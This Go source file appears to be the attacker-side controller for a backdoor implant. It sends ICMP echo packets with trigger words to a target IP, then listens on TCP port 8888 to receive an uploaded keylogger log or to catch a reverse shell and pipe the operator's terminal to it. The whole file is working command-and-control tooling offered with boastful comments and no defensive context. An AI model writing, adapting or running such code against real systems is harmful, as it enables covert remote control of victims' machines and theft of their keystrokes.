package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv6"
)

const PORT = "8888"
const BUFFERSIZE = 1024

func ping(meme string) {
	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatalf("listen err, %s", err)
	}
	defer c.Close()
	wm := icmp.Message{
		Type: ipv6.ICMPTypeEchoRequest, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: []byte(meme),
		},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	var pingCount int = 0
	for {
		select {
		case <-pause:
			return
		default:
			if pingCount == 3 {
				fmt.Println("Target Might Just Have Rebooted")
				fmt.Println("Please Wait for 3-4 Minutes")
			}
			if _, err := c.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(os.Args[1])}); err != nil {
				log.Fatalf("WriteTo err, %s", err)
			}
			pingCount += 1
			time.Sleep(2 * time.Second)
		}
	}
}

func receiveLog(wg *sync.WaitGroup) {
	defer wg.Done()
	server, err := net.Listen("tcp", ":"+PORT)
	if err != nil {
		fmt.Println("Error listetning: ", err)
		os.Exit(1)
	}
	defer server.Close()
	connection, err := server.Accept()
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	fmt.Println("There Is No Place Like", connection.RemoteAddr(), "Wait Fk Off")
	close(pause)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)
	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)

	var fileName = "log.txt"
	newFile, err := os.Create(fileName)

	if err != nil {
		panic(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < BUFFERSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+BUFFERSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, BUFFERSIZE)
		receivedBytes += BUFFERSIZE
	}
	fmt.Println("File Yeeted as log.txt")
}

func listenShell(wg *sync.WaitGroup) {
	defer wg.Done()
	l, err := net.Listen("tcp", ":"+PORT)
	if nil != err {
		log.Fatalf("Could not bind to interface", err)
	}
	defer l.Close()
	c, err := l.Accept()
	if nil != err {
		log.Fatalf("Could not accept connection", err)
	}
	close(pause)
	fmt.Println("Something is coming from", c.RemoteAddr())
	fmt.Println("A Shit Shell is Spawned :)")
	// I am HaCk1nG LOL
	go io.Copy(c, os.Stdin)
	io.Copy(os.Stdout, c)
}

func main() {
	var wg sync.WaitGroup
	if "key" == os.Args[2][:3] {
		fmt.Println("Yeeting For Keylog...")
		wg.Add(1)
		go receiveLog(&wg)
		go ping("yeet")
	} else if "shell" == os.Args[2][:5] {
		fmt.Println("Nani A Reverse Shell !??")
		wg.Add(1)
		go listenShell(&wg)
		go ping("nani")
	}
	wg.Wait()
}

var pause = make(chan bool)
